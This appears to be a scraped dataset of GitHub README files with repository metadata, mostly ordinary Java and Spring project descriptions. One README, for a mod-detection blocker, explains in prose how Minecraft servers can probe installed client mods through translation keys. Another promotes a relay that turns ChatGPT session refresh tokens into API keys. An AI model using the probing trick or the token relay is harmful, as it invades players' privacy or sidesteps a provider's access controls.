| [text-classification](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/00-use-cases/text-classification)               | Text classification using LLMs via Ollama.                                  |

### 1. Chat Completion Models

| Project                                                                                                                                           | Description                                       |
|---------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------|
| [chat-models-mistral-ai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/01-chat-models/chat-models-mistral-ai)                 | Text generation with LLMs via Mistral AI.         |
| [chat-models-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/01-chat-models/chat-models-ollama)                         | Text generation with LLMs via Ollama.             |
| [chat-models-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/01-chat-models/chat-models-openai)                         | Text generation with LLMs via OpenAI.             |
| [chat-models-multiple-providers](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/01-chat-models/chat-models-multiple-providers) | Text generation with LLMs via multiple providers. |

### 2. Prompts, Messages, and Templates and Multimodality

| Project                                                                                                                                     | Description                                                              |
|---------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------|
| [prompts-basics-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/02-prompts/prompts-basics-ollama)                 | Prompting using simple text with LLMs via Ollama.                        |
| [prompts-basics-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/02-prompts/prompts-basics-openai)                 | Prompting using simple text with LLMs via OpenAI.                        |
| [prompts-messages-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/02-prompts/prompts-messages-ollama)             | Prompting using structured messages and roles with LLMs via Ollama.      |
| [prompts-messages-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/02-prompts/prompts-messages-openai)             | Prompting using structured messages and roles with LLMs via OpenAI.      |
| [prompts-templates-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/02-prompts/prompts-templates-ollama)           | Prompting using templates with LLMs via Ollama.                          |
| [prompts-templates-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/02-prompts/prompts-templates-openai)           | Prompting using templates with LLMs via OpenAI.                          |

### 3. Structured Output

| Project                                                                                                                               | Description                                                                     |
|---------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------|
| [structured-output-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/03-structured-output/structured-output-ollama) | Converting the LLM output to structured JSON and Java objects via Ollama.       |
| [structured-output-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/03-structured-output/structured-output-openai)    | Converting the LLM output to structured JSON and Java objects via Open AI. |

### 4. Multimodality

| Project                                                                                                                                | Description                                                              |
|----------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------|
| [multimodality-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/04-multimodality/multimodality-ollama) | Multimodality to include various media in a prompt with LLMs via Ollama. |
| [multimodality-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/04-multimodality/multimodality-openai)      | Multimodality to include various media in a prompt with LLMs via OpenAI. |

### 5. Function Calling

| Project                                                                                                                                          | Description                                |
|--------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------|
| [function-calling-mistral-ai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/05-function-calling/function-calling-mistral-ai) | Function calling with LLMs via Mistral AI. |
| [function-calling-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/05-function-calling/function-calling-ollama)         | Function calling with LLMs via Ollama.     |
| [function-calling-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/05-function-calling/function-calling-openai)         | Function calling with LLMs via OpenAI.     |

### 6. Embedding Models

| Project                                                                                                                                              | Description                                                                                     |
|------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------|
| [embedding-models-mistral-ai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/06-embedding-models/embedding-models-mistral-ai)     | Vector transformation (embeddings) with LLMs via Mistral AI.                                    |
| [embedding-models-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/06-embedding-models/embedding-models-ollama)             | Vector transformation (embeddings) with LLMs via Ollama.                                        |
| [embedding-models-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/06-embedding-models/embedding-models-openai)             | Vector transformation (embeddings) with LLMs via OpenAI.                                        |
| [embedding-models-transformers](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/06-embedding-models/embedding-models-transformers) | Vector transformation (embeddings) with LLMs via ONNX Sentence Transformers. |

### 7. Data Ingestion

| Project                                                                                                                                                              | Description                                                                            |
|----------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------|
| [document-readers-json-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/07-data-ingestion/document-readers-json-ollama)                     | Reading and vectorizing JSON documents with LLMs via Ollama.                           |
| [document-readers-markdown-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/07-data-ingestion/document-readers-markdown-ollama)                 | Reading and vectorizing Markdown documents with LLMs via Ollama.                       |
| [document-readers-pdf-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/07-data-ingestion/document-readers-text-ollama)                      | Reading and vectorizing PDF documents with LLMs via Ollama.                            |
| [document-readers-text-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/07-data-ingestion/document-readers-text-ollama)                     | Reading and vectorizing text documents with LLMs via Ollama.                           |
| [document-readers-tika-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/07-data-ingestion/document-readers-tika-ollama)                     | Reading and vectorizing documents with LLMs and Tika via Ollama.                       |
| [document-transformers-metadata-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/07-data-ingestion/document-transformers-metadata-ollama)   | Enrich documents with keywords and summary metadata for enhanced retrieval via Ollama. |
| [document-transformers-splitters-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/07-data-ingestion/document-transformers-splitters-ollama) | Divide documents into chunks to fit the LLM context window via Ollama.                 |

### 8. Vector Stores

_Coming soon_

### 9. Retrieval Augmented Generation (RAG)

| Project                                                                                            | Description                                                                          |
|----------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------|
| [rag-naive](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/09-rag/rag-naive)    | Basic question answering with documents (RAG) using LLMs via Ollama and PGVector.    |
| [rag-advanced](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/09-rag/rag-advanced) | Advanced question answering with documents (RAG) using LLMs via Ollama and PGVector. |

### 10. Memory

_Coming soon_

### 11. Image Models

| Project                                                                                                                      | Description                            |
|------------------------------------------------------------------------------------------------------------------------------|----------------------------------------|
| [image-models-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/11-image-models/image-models-openai) | Image generation with LLMs via OpenAI. |

### 12. Audio Models

| Project                                                                                                                                                  | Description                                |
|----------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------|
| [audio-models-speech-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/12-audio-models/audio-models-speech-openai)               | Speech generation with LLMs via OpenAI.    |
| [audio-models-transcription-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/12-audio-models/audio-models-transcription-openai) | Speech transcription with LLMs via OpenAI. |

### 13. Moderation Models

_Coming soon_

### 14. Observability

| Project                                                                                                                                                         | Description                              |
|-----------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------|
| [observability-models-mistral-ai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/10-observability/observability-models-mistral-ai)            | LLM Observability for Mistral AI.        |
| [observability-models-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/10-observability/observability-models-ollama)                   | LLM Observability for Ollama.            |
| [observability-models-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/10-observability/observability-models-openai)                   | LLM Observability for OpenAI.            |
| [observability-vector-stores-pgvector](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/10-observability/observability-vector-stores-pgvector) | Vector Store Observability for PGVector. |

### 15. Evaluation

_Coming soon_

### 16. Agents

_Coming soon_

## References and Additional Resources

* [Spring AI Reference Documentation](https://docs.spring.io/spring-ai/reference/index.html)

### Conferences

* [Introducing Spring AI by Christian Tzolov and Mark Pollack (Spring I/O 2024)](https://www.youtube.com/watch?v=umKbaXsiCOY)
* [Spring AI Is All You Need by Christian Tzolov (GOTO Amsterdam 2024)](https://www.youtube.com/watch?v=vuhMti8B5H0)
* [Concerto for Java and AI - Building Production-Ready LLM Applications by Thomas Vitale (Spring I/O 2024)](https://www.youtube.com/watch?v=3zTf8NxF-6o)

### Videos

* [Building Intelligent Applications With Spring AI by Dan Vega (JetBrains Live Stream)](https://www.youtube.com/watch?v=x6KmUyPWy2Q)
* [Spring AI Series by Dan Vega](https://www.youtube.com/playlist?list=PLZV0a2jwt22uoDm3LNDFvN6i2cAVU_HTH)
* [Spring AI Series by Craig Walls](https://www.youtube.com/playlist?list=PLH5OU4wXVJc9aECkMUVPCi8g3pzs8pZ3E)
* [Spring AI Series by Josh Long](https://www.youtube.com/playlist?list=PLgGXSWYM2FpMXvYb681axdH5JSLEPPyrz)

### Demos

* [Airline Customer Support (Marcus Hellberg)](https://github.com/marcushellberg/java-ai-playground/tree/spring-ai)
* [Composer Assistant (Thomas Vitale)](https://github.com/ThomasVitale/concerto-for-java-and-ai)
* [Document Assistant (Marcus Hellberg)](https://github.com/marcushellberg/docs-assistant)
* [Flight Booking (Christian Tzolov)](https://github.com/tzolov/playground-flight-booking)

### Workshops

* [Spring AI - Zero to Hero (Adib Saikali, Christian Tzolov)](https://github.com/asaikali/spring-ai-zero-to-hero/tree/main)
",0,0,1,apache-2.0,3.0
HttpMarco/evelon,master,,5,4,3,apache-2.0,13.0
apple/pkl,main,,9,129,4,apache-2.0,374.0
krkarma777/online-store,master,"# SEED: Open Market Project

## 설명

SEED는 JDK 17, Oracle DB 19c, Spring Boot, JPA, Thymeleaf를 기반으로 구현된 오픈마켓 웹 프로젝트입니다. 본 프로젝트는 테스트 주도 개발(TDD)과 RESTful 아키텍처를 중심으로 개발되어, 복잡한 시스템의 효과적인 관리와 고품질 코드 작성에 초점을 맞추고 있습니다. 사용자와 판매자 모두를 위한 다양한 기능을 포함하며, Spring Security 6, JWT, OAuth2 등 최신 웹 기술을 통해 사용자 경험과 보안성을 강화한 프로젝트입니다.

## 특징

- **RESTful Architecture**: 전통적인 MVC 패턴에서 API 중심 아키텍처로 전환하여, 코드 중복 감소와 유지보수 향상을 도모했습니다.
- **Security Implementations**: Spring Security와 JWT를 사용한 강력한 인증 및 권한 부여 프로세스 구현.
- **Dynamic Content Management**: Thymeleaf와 함께 다이나믹 웹 콘텐츠를 효율적으로 관리합니다.
- **E-Commerce Ready**: 다양한 결제 API 통합으로 사용자와 판매자에게 매끄러운 거래 경험 제공.

## 기술 스택

- JDK 17
- Oracle DB 19c
- Spring Boot
- JPA & Hibernate
- Thymeleaf
- Spring Security, OAuth2, JWT
- Daum Address API, CKEditor5, Chart JS
- Kakao and Naver Login API
- PayPal API

### 시작하기

- JDK 17
- Oracle DB 19c 설치 필요
- 필요한 모든 의존성은 `build.gradle`에 명시되어 있습니다.
  
1. 프로젝트 클론: git clone https://github.com/krkarma777/online-store

# 환경 설정

이 프로젝트를 올바르게 실행하기 위해서는 여러 환경 설정이 필요합니다. 아래에 필요한 구성 상세 정보를 제공합니다.

## 데이터베이스 구성

Oracle DB가 설치되어 있고 실행 중인지 확인하세요. 데이터베이스 연결을 위한 다음 환경 변수를 설정하세요.

- `SPRING_DATASOURCE_URL`: Oracle 데이터베이스 연결을 위한 JDBC URL.
- `SPRING_DATASOURCE_USERNAME`: 데이터베이스 사용자 이름.
- `SPRING_DATASOURCE_PASSWORD`: 데이터베이스 비밀번호.

로컬 설정 예시:
```properties
spring.datasource.url=jdbc:oracle:thin:@localhost:1522:orcl
spring.datasource.username=사용자이름
spring.datasource.password=비밀번호
```

## 이메일 서비스 구성
알림 및 확인 이메일을 보낼 수 있도록 메일 서버를 구성합니다.

```properties
spring.mail.host=smtp.gmail.com
spring.mail.port=587
spring.mail.username=yourEmail@gmail.com
spring.mail.password=앱비밀번호
spring.mail.properties.mail.smtp.auth=true
spring.mail.properties.mail.smtp.starttls.enable=true
```

## OAuth2 구성
각 서비스(카카오, 네이버 등)에 대한 클라이언트 ID, 클라이언트 비밀번호 및 리다이렉트 URI를 지정하여 OAuth2 제공자를 설정하세요. 이 값들은 버전 관리 시스템에 노출되지 않도록 안전하게 저장되어야 합니다.

```
spring.security.oauth2.client.registration.kakao.client-id=카카오클라이언트ID
spring.security.oauth2.client.registration.kakao.client-secret=카카오클라이언트비밀번호
spring.security.oauth2.client.registration.naver.client-id=네이버클라이언트ID
spring.security.oauth2.client.registration.naver.client-secret=네이버클라이언트비밀번호
```

## JWT 비밀 키
JWT 토큰을 서명하는 데 사용되는 비밀 키를 구성하세요. 이 키는 기밀로 유지되어야 합니다.

```
spring.jwt.secret=비밀키
```

## 애플리케이션 실행
모든 구성이 설정되면, 다음을 사용하여 애플리케이션을 실행할 수 있습니다.

```
./gradlew bootRun
```

## 추가 사항
- 요구 사항에 맞게 로깅 설정을 조정하여 디버깅 및 모니터링을 개선하세요.
- 처리할 예정인 파일 크기를 기반으로 멀티파트 설정을 수정하세요.
- 애플리케이션의 보안 설정을 주기적으로 검토하고 업데이트하여 강력한 보안을 유지하세요.

### Contributing

모든 종류의 기여를 환영합니다. 이슈 트래킹, 풀 리퀘스트 등을 통해 참여해주세요. 기여 전에 `CONTRIBUTING.md`를 확인해주세요.

### License

이 프로젝트는 MIT 라이센스를 따릅니다. 자세한 내용은 `LICENSE` 파일을 참조하십시오.

### Contact

오유준 - krkarma777@gmail.com

Project Link: [https://github.com/krkarma777/online-store](https://github.com/krkarma777/online-store)













- **Features and Screenshots**: [Link](https://krkarma777.notion.site/SEED-a2c911191c124a29b57b3f1f841c7264)

",0,17,1,mit,44.0
xyzeva/ender-relay,main,"
<div align=""center"">

  <img width=""384"" height=""384"" src=""https://github.com/xyzeva/ender-relay/assets/133499694/0a9b6ff3-a7bd-42ba-ba3c-0845913f9917""></img>
  <h1>The Ender Relay</h1>
  <div>
    <a href=""https://modrinth.com/mod/end-relay""><img alt=""modrinth"" height=""56"" src=""https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/cozy/available/modrinth_vector.svg""></a>
    <a href=""https://modrinth.com/mod/fabric-api""><img alt=""fabric-api"" height=""56"" src=""https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/cozy/requires/fabric-api_vector.svg""></a>
<a href=""https://buymeacoffee.com/xyzeva""><img alt=""buymeacoffee-singular"" height=""56"" src=""https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/cozy/donate/buymeacoffee-singular_vector.svg""></a>
  </div>
</div>

This is a one-to-one replica of the [ender relay concept](https://www.youtube.com/watch?v=L1i4izl25V4) a youtuber by the name of Kenadian made.

The resources for the block were provided by Kenadian.

The Ender Relay is a block that can only be used in the end, it is crafted with a lodestone compass and can be charged like a respawn anchor, instead with a end crystal. When a player clicks the block, it teleports to the lodestone compasses location, ontop of the lodestone.

This completes the trilogy of the bed, respawn anchor by introducing a transportation item for the end dimension.

For more on the concept (and the mod, since its a 1:1), watch the video linked above!
",3,2,1,mit,0.0
JustAlittleWolf/ModDetectionPreventer,1.20.4,"<h1 style=""text-align: center"">Mod Detection Preventer</h1>

⚠️ For now please stop using this mod. Another method of detecting mods has been found, and I am not able to resolve it at this time. Using this mod might cause you to get banned. ⚠️

<p align=""center"">
<img src=""src/main/resources/assets/moddetectionpreventer/icon.png"">
</p>

<p style=""text-align: center"">A simple mod that prevents a security vulnerability allowing servers to detect which mods are installed on
the client side.</p>


**While I try my best to keep this mod up to date, server admins might find a new method to access your mods-list. It is always recommended that you follow the server rules.**

## The Vulnerability

Minecraft has a feature that allows text (in chat, on signs, or in the bossbar) to be specified by a keybind the user
has set, or a translation key. The Client will then replace the translation key, or the keybind with the stored value.
This can be abused by the server by serving the client a sign with such a placeholder (for example Sodium:
`sodium.option_impact.low`). By immediately closing the sign screen, the client sends the edited text to the server
without ever seeing a sign open screen. The server can then detect wether you have that specific mod installed, by
checking if your client replaced the placeholder with the corresponding text (`sodium.option_impact.low -> Low`). If
you don't have Sodium installed, the placeholder will stay there
(`sodium.option_impact.low -> sodium.option_impact.low`).

This also works on the Anvil screen. The server could prompt you to open the anvil screen, with an item in the
renaming slot that has a translation key as it's name. The client would then rename the item to the corresponding
value and send an update to the server. (Huge thanks to Frog, `@croaak` on discord, for figuring this out)

This detection method works for any mod that has custom translations.

## The Fix

This mod fixes this issue by simply not resolving any translation or keybind placeholders on signs, except vanilla
ones. This makes it impossible for the server to use this method to detect installed mods.

To verify this works you can test it in a [test world](https://github.com/JustAlittleWolf/ModDetectionPreventer/raw/1.20.4/testWorld.zip).

## Intentions

~~While this feature can be used to prevent harm by detecting cheaters early, it is implemented improperly on some
servers, including [Cytooxien](CytooxienDetectedMods.md). Immediately banning players upon joining, simply because they
have tweakeroo installed, is unacceptable.~~
After a discussion with the developer of Cytooxien, they told me that players won't get banned for using tweakeroo, only kicked repeatedly.
",3,2,2,mit,0.0
jsl1992/JiChat,master,"# 【JiChat】基于Netty打造百万级用户IM平台：探索可扩展和高性能通信的威力

<!--
Travis CI 徽章：
访问 Travis CI，使用 GitHub 账户登录，并启用你的项目的构建。
在仓库的 Travis CI 页面找到 ""Build Status"" 徽章，选择需要的格式，然后将其添加到你的 README 文件中。
Codecov 徽章：

访问 Codecov，使用 GitHub 账户登录，并启用你的项目的代码覆盖率报告。
在仓库的 Codecov 页面找到 ""Badge"" 选项，选择需要的格式，然后将其添加到你的 README 文件中。
Maven中央仓库版本徽章：

访问 Shields.io，选择 ""Maven Central""，输入你的 Maven 仓库坐标（group ID 和 artifact ID），然后生成徽章代码并添加到你的 README 文件中。
许可证信息徽章：

访问 Shields.io，选择 ""License""，输入你的项目的许可证，然后生成徽章代码并添加到你的 README 文件中。
Is It Maintained 徽章：

访问 Is It Maintained，搜索你的项目，获取徽章代码并添加到你的 README 文件中。
-->
[![CircleCI](https://dl.circleci.com/status-badge/img/circleci/CgWndursnfTN85ScJmBdyi/R7S69YhP9B1F39MDmdLyCB/tree/master.svg?style=svg&circle-token=f619bb84e6e68f060795b1c21a25d39a1c1b0cb4)](https://dl.circleci.com/status-badge/redirect/circleci/CgWndursnfTN85ScJmBdyi/R7S69YhP9B1F39MDmdLyCB/tree/master)
[![codecov](https://codecov.io/gh/jsl1992/JiChat/graph/badge.svg?token=NVFGT76HQF)](https://codecov.io/gh/jsl1992/JiChat)
[![Codacy Badge](https://app.codacy.com/project/badge/Grade/dc30543fa9844f98bc5fa169c97913d9)](https://app.codacy.com/gh/jsl1992/JiChat/dashboard?utm_source=gh&utm_medium=referral&utm_content=&utm_campaign=Badge_grade)
![maven](https://img.shields.io/maven-central/v/com.ji.jichat/jichat.svg)
![GitHub License](https://img.shields.io/github/license/jsl1992/JiChat)
[![Average time to resolve an issue](http://isitmaintained.com/badge/resolution/jsl1992/JiChat.svg)](http://isitmaintained.com/project/jsl1992/JiChat ""Average time to resolve an issue"")
[![Percentage of issues still open](http://isitmaintained.com/badge/open/jsl1992/JiChat.svg)](http://isitmaintained.com/project/jsl1992/JiChat ""Percentage of issues still open"")
[![Leaderboard](https://img.shields.io/badge/JiChat-%E6%9F%A5%E7%9C%8B%E8%B4%A1%E7%8C%AE%E6%8E%92%E8%A1%8C%E6%A6%9C-orange)](https://github.com/jsl1992/JiChat)



# 前言
 'JiChat' 的IM系统:不仅支持多客户端登录，还实现了历史消息同步、消息顺序一致性和零消息丢失的特性,同时支持端到端加密会话保护用户隐私。为确保系统的可扩展性，整个架构按照百万级用户流量的标准进行设计，并支持无缝的横向扩展。



# 系统设计
系统采用了分布式架构，基于 Spring Cloud 实现微服务化，服务注册和发现方面使用 Nacos，消息中间件选择 RabbitMQ，持久性数据存储采用 MySQL 数据库，缓存层使用 Redis。在数据访问层面，使用 MyBatis-Plus 简化数据库操作。服务之间通过 OpenFeign 实现远程调用，以提高服务之间的通信效率。为了满足即时通讯需求，引入了 Netty 框架，以实现高性能、实时的消息传递。




# 业务流程
![image](https://github.com/jsl1992/JiChat/assets/34052259/7ccf4c17-59ef-4eff-991f-41c624812791)



## 消息流程
1. 用户A向聊天服务器1发送聊天消息。
2. 聊天服务器1从ID生成器获取消息ID。
3. 聊天服务器1将消息发送到消息同步队列。
4. 消息存储在键值存储中。
5. a.如果用户 B 在线，则消息将转发到用户 B 所在的聊天服务器 2连接的。
5. b. 如果用户 B 离线，则从推送通知 (PN) 服务器发送推送通知。
6. 聊天服务器2将消息转发给用户B。有一个持久的TCP用户 B 和聊天服务器 2 之间的连接。

消息大略流程： 客户端A→服务端a→服务端b→客户端B


## 项目部署
### (1)安装docker和docker-compose，安装组件
请执行doc目录中的docker-compose.yml文件，以安装RabbitMQ、Nacos、MySQL、Redis等组件。如果Nacos安装失败，请确保在MySQL中初始化Nacos所需的nacos-db.sql文件数据。
### (2)启动user-service-app和chat-service-app服务
进行JiChat数据库的初始化，执行jichat_user.sql脚本。然后，修改user-service-app和chat-service-app服务的配置文件，确保连接到正确的RabbitMQ、Nacos、MySQL和Redis地址以及账号信息。最后，启动user-service-app和chat-service-app服务。
### (3)启动chat-client客户端
调用user-service-app的注册账号接口后，修改chat-client的application-dev.yaml文件中的用户信息和连接地址，即可启动客户端。为了方便实现通信，建议在dev和test配置文件中使用不同端口和用户id
### (4)访问地址
    chat-server swagger: http://localhost:18080/chat-api/doc.html#/home
    user-server swagger: http://localhost:18081/user-api/doc.html#/home
    chat-client swagger: http://localhost:9192/doc.html#/home

# 项目业务分析博客
JiChat 博客地址 [https://blog.csdn.net/weixin_42887222/article/details/135910752 ](https://blog.csdn.net/weixin_42887222/article/details/135910752)

# 反馈交流
邮箱: jishenglong92@gmail.com

",0,0,4,mit,2.0
DJ-Raven/java-messenger,main,"# Java Messenger

This is a simple messenger app built using Java Swing for the client-side GUI, Node.js for the server-side API, and Socket-IO for real-time communication. The graphical user interface (GUI) is styled using FlatLaf.

**This project is still in development.**

<img src=""https://github.com/DJ-Raven/java-messenger/blob/main/screenshot/sample-2.png?raw=true"" alt=""sample 2"" width=""400""/>&nbsp;
<img src=""https://github.com/DJ-Raven/java-messenger/blob/main/screenshot/sample-3.png?raw=true"" alt=""sample 3"" width=""400""/>&nbsp;

## Demo
[Download Demo Test](messenger-client/demo/messenger-test-1.4.0.jar?raw=true)

Run demo with `java -jar messenger-test-<version>.jar` or `double-click` (Requires Java 8 or newer)

### Client libraries used (Java)
| Name | GitHub |
| ------------ | ------------ |
| FlatLaf | https://github.com/JFormDesigner/FlatLaf |
| MiG Layout | https://github.com/mikaelgrev/miglayout |
| REST Assured | https://github.com/rest-assured/rest-assured |
| Socket.IO Java client | https://github.com/socketio/socket.io-client-java |
| JSON-Java | https://github.com/stleary/JSON-java?tab=readme-ov-file |
| JLayer | https://github.com/umjammer/jlayer |
| mp3agic | https://github.com/mpatric/mp3agic |
| Thumbnailator | https://github.com/coobird/thumbnailator |
| Swing Modal Dialog | https://github.com/DJ-Raven/swing-modal-dialog |
### Server libraries used (Nodejs)
| Name | GitHub |
| ------------ | ------------ |
| Express | https://github.com/expressjs/express |
| socket.io | https://github.com/socketio/socket.io |
| jsonwebtoken | https://github.com/auth0/node-jsonwebtoken |
| bcrypt.js | https://github.com/dcodeIO/bcrypt.js |
| BlurHash | https://github.com/woltapp/blurhash/tree/master |
| Multer | https://github.com/expressjs/multer |
| MySQL2 | https://github.com/sidorares/node-mysql2 |
| nodemon `dev`| https://github.com/remy/nodemon |
| and more ... |  |
",0,0,1,mit,3.0
HuLaSpark/HuLa-Server,master,,0,1,2,apache-2.0,3.0
Yanyutin753/refresh-gpt-chat,main,"# refresh-gpt-chat

![Docker Image Size (tag)](https://img.shields.io/docker/image-size/yangclivia/refresh-gpt-chat/latest)![Docker Pulls](https://img.shields.io/docker/pulls/yangclivia/refresh-gpt-chat)[![GitHub Repo stars](https://img.shields.io/github/stars/Yanyutin753/refresh-gpt-chat?style=social)](https://github.com/Yanyutin753/refresh-gpt-chat/stargazers)

### 不许白嫖，请给我免费的star⭐吧，十分感谢！

## 简介

#### [refresh-gpt-chat](https://github.com/Yanyutin753/refresh-gpt-chat) 中转oaifree或者PandoraToV1Api的/v1/chat/completions和v1/images/generations接口，把refresh_token当key使用，内含hashmap,自动更新access_token,完美继承pandoraNext留下的refresh_token,支持基本所有的模型，小白也能快速使用！

#### [refresh-gpt-chat](https://github.com/Yanyutin753/refresh-gpt-chat) Intercept the /v1/chat/completions and v1/images/generations interface of oaifree or PandoraToV1Api, use the refresh_token as the key, which contains a hashmap, automatically update the access_token, perfectly inherit the refresh_token left by pandoraNext, support almost all models, even beginners can use it quickly!

-----

> ## 功能特性
>
> * **通过refresh_token自动更新access_token**：方便使用
>
> * **通过refresh_token作为key进行使用**：更好放入one-api里面
>
> * **支持反代v1/images/generations接口**：调用dall-e-3画图更出色
>
> * **支持反代v1/audio/speech接口**：调用tts-1，文字转语音
>
> * **支持反代v1/audio/transcriptions接口**：调用whisper-1，语言转文字
>
> * **可适用于oaifree、PandoraToV1Api项目**：反代服务，直接使用
>
> * **自定义后缀**：防止url被滥用
>
> * **支持base64识图**：能转发识图接口
>
> * **回复打字机处理**：回复更流畅，减少卡顿
>
> * **个人部署**：保障隐私安全
>

## [✨点击查看文档站](https://apifox.com/apidoc/shared-4b9a7517-3f80-47a1-84fc-fcf78827a04a)

> [!important]
>
> * 本项目只提供转发接口🥰
> * 开源项目不易，请点个星星吧！！！

## Sponsor

### 如果你觉得我的开源项目对你有帮助，可以赞助我一杯咖啡嘛，十分感谢！！！

<img src=""https://github.com/Yanyutin753/RefreshToV1Api/assets/132346501/e5ab5e80-1cf2-4822-ae36-f9d0b11ed1b1"" width=""300"" height=""300"">

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=Yanyutin753/refresh-gpt-chat&type=Date)](https://star-history.com/#Yanyutin753/refresh-gpt-chat&Date)
",10,1,1,mit,0.0
xdev-software/spring-data-eclipse-store,develop,"[![Latest version](https://img.shields.io/maven-central/v/software.xdev/spring-data-eclipse-store?logo=apache%20maven)](https://mvnrepository.com/artifact/software.xdev/spring-data-eclipse-store)
[![Build](https://img.shields.io/github/actions/workflow/status/xdev-software/spring-data-eclipse-store/check-build.yml?branch=develop)](https://github.com/xdev-software/spring-data-eclipse-store/actions/workflows/check-build.yml?query=branch%3Adevelop)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=xdev-software_spring-data-eclipse-store&metric=alert_status)](https://sonarcloud.io/dashboard?id=xdev-software_spring-data-eclipse-store)
[![Documentation](https://img.shields.io/maven-central/v/software.xdev/spring-data-eclipse-store?label=docs)](https://spring-eclipsestore.xdev.software/)

<div align=""center"">
    <img src=""assets/Logo.png"" height=""200"" alt=""XDEV Spring-Data Eclipse-Store Logo"">
</div>

# spring-data-eclipse-store

A library to simplify using [EclipseStore](https://eclipsestore.io/) in the [Spring environment](https://spring.io/projects/spring-data/).

What makes this library special is, that it creates a working copy of the data.
This way EclipseStore behaves almost exactly like relational database from a coding perspective.

## Features

The library provides following features:

* Enforces the
  **[Spring data repository concept](https://docs.spring.io/spring-data/jpa/reference/repositories/core-concepts.html)**
  for EclipseStore by
  using [working copies](https://xdev-software.github.io/spring-data-eclipse-store/working-copies.html)
* **[Drop in compatible](https://xdev-software.github.io/spring-data-eclipse-store/installation.html#drop-in-compatible)** for your existing Spring application
* Utilizes **ultra-fast EclipseStore serializing and storing**
* Enables your application to **select
  any [EclipseStore target](https://docs.eclipsestore.io/manual/storage/storage-targets/index.html)** (e.g.
  [PostgreSQL](https://docs.eclipsestore.io/manual/storage/storage-targets/sql-databases/postgresql.html),
  [AWS S3](https://docs.eclipsestore.io/manual/storage/storage-targets/blob-stores/aws-s3.html) or
  [IBM COS](https://github.com/xdev-software/eclipse-store-afs-ibm-cos))
* Can save up to **99%[^1] of monthly costs** in the IBM Cloud and up to 82%[^2] in the AWS Cloud

[^1]:If the COS Connector is used in the IBM Cloud instead of a PostgreSQL and approx. 10,000 entries with a total size
of 1
GB of data are stored. ([IBM Cloud Pricing](https://cloud.ibm.com/estimator/estimates), as of 08.01.2024)

[^2]: If the S3 connector is used instead of DynamoDB under the same conditions at
AWS. ([AWS Pricing Calculator](https://calculator.aws/#/estimate?id=ab85cddf77f0d1aa0457111ed82785dfb836b1d8), as of
08.01.2024)

## Installation & Usage

[**Installation
guide** for the latest release](https://github.com/xdev-software/spring-data-eclipse-store/releases/latest#Installation)

[**Detailed
instructions** are in the documentation](https://xdev-software.github.io/spring-data-eclipse-store/installation.html)

### Supported versions

| Spring-Data-Eclipse-Store | Java   | Spring Data | EclipseStore |
|---------------------------|--------|-------------|--------------|
| ``<= 1.0.2``              | ``17`` | ``3.2.2``   | ``1.1.0``    |
| ``1.0.3/1.0.4``           | ``17`` | ``3.2.3``   | ``1.2.0``    |
| ``1.0.5-1.0.7``           | ``17`` | ``3.2.5``   | ``1.3.2``    |
| ``1.0.8-1.0.10``          | ``17`` | ``3.3.1``   | ``1.3.2``    |
| ``2.0.0-2.1.0``           | ``17`` | ``3.3.2``   | ``1.4.0``    |
